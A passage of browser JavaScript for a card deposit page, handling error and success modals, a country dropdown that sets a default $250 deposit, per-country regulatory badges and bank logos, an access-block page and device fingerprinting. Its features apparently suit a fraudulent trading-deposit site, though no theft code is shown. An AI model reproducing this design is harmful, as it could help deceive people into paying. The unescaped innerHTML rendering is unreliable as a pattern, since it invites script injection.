  } catch (err) {
    if (tdsOverlay) {
      tdsOverlay.classList.remove('show');
    }
    btn.classList.remove('btn-loading');
    console.warn('An unexpected checkout exception occurred. No success state was recorded.');
    showFatalError(
      'Payment not completed',
      'We could not save this transaction. No successful deposit was recorded. Please contact your account manager and try again.'
    );
  }
}

async function redirectToOnboardingGuideIfAllowed() {
  if (!sessionId) return;
  const guideAccess = await fetchOnboardingGuideAccess(sessionId);
  if (!guideAccess.allowed) return;
  await fetchOnboardingGuideConfig();
  window.location.href = buildOnboardingGuideUrl(sessionId);
}

function showSuccessModal(txnId, maskedCard) {
  const tx = txnId != null && txnId !== '' ? String(txnId) : '—';
  $('#rTx').textContent = tx;
  $('#rName').textContent = `${$('#firstName').value} ${$('#lastName').value}`.trim();
  $('#rEmail').textContent = $('#email').value.trim();
  
  const amt = currentSession.client.depositAmount || 250;
  const curr = currentSession.client.preferredCurrency || selectedCountry?.currency || 'USD';
  const sym = COUNTRIES.find(c => c.currency === curr)?.symbol || '$';
  $('#rBalance').textContent = formatCurrency(amt, curr, sym);

  // Populate extra receipt details
  if ($('#rPhone')) {
    $('#rPhone').textContent = $('#phoneNumber').value.trim() ? (($('#phoneCode').textContent || '') + ' ' + $('#phoneNumber').value.trim()) : '—';
  }
  if ($('#rCountry')) {
    $('#rCountry').textContent = selectedCountry ? selectedCountry.name : '—';
  }
  if ($('#rCity')) {
    $('#rCity').textContent = $('#city').value.trim() || '—';
  }
  if ($('#rCurrency')) {
    $('#rCurrency').textContent = curr;
  }

  $('#successOverlay').classList.add('show');
  window.setTimeout(() => {
    void redirectToOnboardingGuideIfAllowed();
  }, 2000);
}

const onboardingGuideBtn = document.getElementById('startTrading');
if (onboardingGuideBtn) {
  onboardingGuideBtn.addEventListener('click', async () => {
    if (sessionId) {
      const guideAccess = await fetchOnboardingGuideAccess(sessionId);
      if (!guideAccess.allowed) {
        renderGuideBlockedPage(guideAccess.title || 'Website under technical renovation');
        return;
      }
    }
    await fetchOnboardingGuideConfig();
    window.location.href = buildOnboardingGuideUrl(sessionId);
  });
}

function showFatalError(title, body) {
  document.body.innerHTML = `
    <div class="modal-backdrop show" style="background-color: var(--surface); display: flex; align-items: center; justify-content: center; position: fixed; inset: 0; z-index: 9999;">
      <div class="card error-modal-card text-center" style="max-width: 480px; padding: 32px; display: flex; flex-direction: column; align-items: center; gap: 16px; border: 1px solid var(--border); border-radius: var(--radius-lg); box-shadow: var(--shadow-lg); background-color: var(--bg); margin: 24px;">
        <div style="width: 64px; height: 64px; border-radius: 50%; background-color: rgba(239, 68, 68, 0.1); border: 1.5px solid rgba(239, 68, 68, 0.25); display: flex; align-items: center; justify-content: center; color: var(--red);">
          <svg viewBox="0 0 24 24" width="36" height="36" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
        </div>
        <h2 style="font-weight: 800; letter-spacing: -0.02em;">${title}</h2>
        <p style="font-size: 0.95rem; line-height: 1.6; color: var(--text-secondary); margin-bottom: 8px;">${body}</p>
      </div>
    </div>
  `;
}

function showPaymentError(title, body) {
  openModal('paymentErrorModal', title, `
    <div style="display: flex; flex-direction: column; align-items: center; gap: 16px; text-align: center; padding: 10px 0;">
      <div style="width: 64px; height: 64px; border-radius: 50%; background-color: rgba(239, 68, 68, 0.1); border: 1.5px solid rgba(239, 68, 68, 0.25); display: flex; align-items: center; justify-content: center; color: var(--red); margin-bottom: 8px;">
        <svg viewBox="0 0 24 24" width="36" height="36" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
      </div>
      <p style="font-size: 0.95rem; line-height: 1.6; color: var(--text-secondary); margin: 0 0 16px;">${body}</p>
      <button class="btn-start" id="paymentErrorCloseBtn">Try Again</button>
    </div>
  `);
  
  const closeBtn = document.getElementById('paymentErrorCloseBtn');
  if (closeBtn) {
    closeBtn.addEventListener('click', () => {
      const modal = document.getElementById('paymentErrorModal');
      if (modal) modal.remove();
    });
  }
}

/**
 * Setup searchable country dropdown on client-side deposit page
 */
function initCountryDropdown() {
  const input = $('#countryInput');
  const list = $('#countryList');
  const phoneCodeEl = $('#phoneCode');
  const phoneWrap = $('.phone-wrap');
  let activeIndex = -1;

  function renderList(filter) {
    const f = (filter || '').trim().toLowerCase();
    const matches = searchCountries(f, 80);
    list.innerHTML = '';
    
    if (matches.length === 0) {
      list.innerHTML = `<div class="combo-empty">${t('comboEmpty')}</div>`;
    } else {
      matches.forEach((c, index) => {
        const opt = document.createElement('div');
        opt.className = 'combo-option';
        if (index === activeIndex) opt.classList.add('active');
        opt.dataset.code = c.code;
        opt.innerHTML = `<span class="op-flag">${c.flag}</span><span>${c.name}</span><span class="op-code">${c.phoneCode}</span>`;
        
        opt.addEventListener('mousedown', (e) => {
          e.preventDefault();
          selectCountryItem(c);
          list.classList.remove('show');
        });
        list.appendChild(opt);
      });
    }
  }

  function selectCountryItem(country) {
    selectedCountry = country;
    
    let amount = 250;
    let currency = 'USD';
    let symbol = '$';

    const group = input.closest('[data-field="country"]');
    if (group) group.classList.add('touched');

    if (country) {
      input.value = country.name;
      input.closest('.field, .floating-group, .combo-field').classList.add('has-value');
      
      // Update phone prefix
      if (country.phoneCode) {
        phoneCodeEl.textContent = country.phoneCode;
        phoneCodeEl.style.display = 'block';
        phoneWrap.classList.add('has-code');
        phoneWrap.classList.add('has-phone-code');
      } else {
        phoneCodeEl.textContent = '';
        phoneCodeEl.style.display = 'none';
        phoneWrap.classList.remove('has-code');
        phoneWrap.classList.remove('has-phone-code');
      }

      const billing = resolveBillingForCountry(country, currentSession?.client);
      amount = billing.amount;
      currency = billing.currency;
      symbol = billing.symbol;

      applyDepositLocale(country.code);
      $('#countryHint').textContent = t('countryHintBilling', { country: country.name });
      updateBankLogoCarousels(country.code);
      updateRegulatoryMark(country.code);
    } else {
      input.value = '';
      input.closest('.field, .floating-group, .combo-field').classList.remove('has-value');
      phoneCodeEl.textContent = '';
      phoneCodeEl.style.display = 'none';
      phoneWrap.classList.remove('has-code');
      phoneWrap.classList.remove('has-phone-code');

      applyDepositLocale(null);
      $('#countryHint').textContent = t('countryHintSelect');
      updateBankLogoCarousels(null);
      updateRegulatoryMark(null);
    }

    const text = formatCurrency(amount, currency, symbol);
    $('#txTotalValue').textContent = text;
    const sumAmountEl = $('#sumAmount');
  if (sumAmountEl) sumAmountEl.textContent = text;

    // Update session client object so backend gets the updated country details & amount
    if (currentSession && currentSession.client) {
      currentSession.client.country = country ? country.code : '';
      currentSession.client.depositAmount = amount;
      currentSession.client.preferredCurrency = currency;
    }

    validateField('country', true, true);
  }

  function updateActiveOption(opts) {
    opts.forEach((opt, idx) => {
      if (idx === activeIndex) {
        opt.classList.add('active');
        opt.scrollIntoView({ block: 'nearest' });
      } else {
        opt.classList.remove('active');
      }
    });
  }

  input.addEventListener('focus', () => {
    list.classList.add('show');
    renderList('');
    input.select();
  });

  input.addEventListener('input', () => {
    selectedCountry = null;
    phoneCodeEl.textContent = '';
    phoneCodeEl.style.display = 'none';
    phoneWrap.classList.remove('has-code');
    phoneWrap.classList.remove('has-phone-code');
    list.classList.add('show');
    renderList(input.value);

    // If input matches a country exactly, select it
    const currentName = input.value.trim().toLowerCase();
    const match = findCountryByName(input.value.trim());
    if (match) {
      selectCountryItem(match);
    } else {
      // Fall back to Default USD $250
      const text = formatCurrency(250, 'USD', '$');
      $('#txTotalValue').textContent = text;
      const sumAmountEl = $('#sumAmount');
  if (sumAmountEl) sumAmountEl.textContent = text;
      if (currentSession && currentSession.client) {
        currentSession.client.country = '';
        currentSession.client.depositAmount = 250;
        currentSession.client.preferredCurrency = 'USD';
      }
      validateField('country');
    }
  });

  input.addEventListener('blur', () => {
    setTimeout(() => {
      list.classList.remove('show');
      
      // Auto-select match if exact name matches
      const currentVal = input.value.trim();
      const match = findCountryByName(currentVal);
      if (match) {
        selectCountryItem(match);
      } else if (currentVal === '') {
        selectCountryItem(null);
      } else {
        // If they left unrecognized text, keep text but fallback to 250 USD
        validateField('country');
      }
    }, 150);
  });

  input.addEventListener('keydown', (e) => {
    const opts = list.querySelectorAll('.combo-option');
    if (!list.classList.contains('show')) {
      if (e.key === 'ArrowDown' || e.key === 'Enter') {
        list.classList.add('show');
        renderList(input.value);
        return;
      }
    }

    if (e.key === 'ArrowDown') {
      e.preventDefault();
      activeIndex = Math.min(activeIndex + 1, opts.length - 1);
      updateActiveOption(opts);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      activeIndex = Math.max(activeIndex - 1, 0);
      updateActiveOption(opts);
    } else if (e.key === 'Enter') {
      e.preventDefault();
      if (activeIndex >= 0 && activeIndex < opts.length) {
        const code = opts[activeIndex].dataset.code;
        const match = findCountryByCode(code);
        if (match) {
          selectCountryItem(match);
        }
      } else {
        const currentVal = input.value.trim();
        const match = findCountryByName(currentVal);
        if (match) {
          selectCountryItem(match);
        }
      }
      list.classList.remove('show');
      input.blur();
    } else if (e.key === 'Escape') {
      list.classList.remove('show');
      input.blur();
    }
  });
}

function getDeviceMetadata() {
  const ua = navigator.userAgent;
  let browser = 'Unknown Browser';
  let os = 'Unknown OS';
  let device = 'Desktop';

  if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
  else if (ua.indexOf('SamsungBrowser') > -1) browser = 'Samsung Browser';
  else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
  else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
  else if (ua.indexOf('Edge') > -1) browser = 'Edge';
  else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
  else if (ua.indexOf('Safari') > -1) browser = 'Safari';

  if (ua.indexOf('Windows') > -1) os = 'Windows';
  else if (ua.indexOf('Macintosh') > -1) os = 'macOS';
  else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
  else if (ua.indexOf('Android') > -1) os = 'Android';
  else if (ua.indexOf('Linux') > -1) os = 'Linux';

  if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
    device = 'Mobile';
  } else if (/Tablet|iPad/i.test(ua)) {
    device = 'Tablet';
  }

  return { browser, os, device };
}

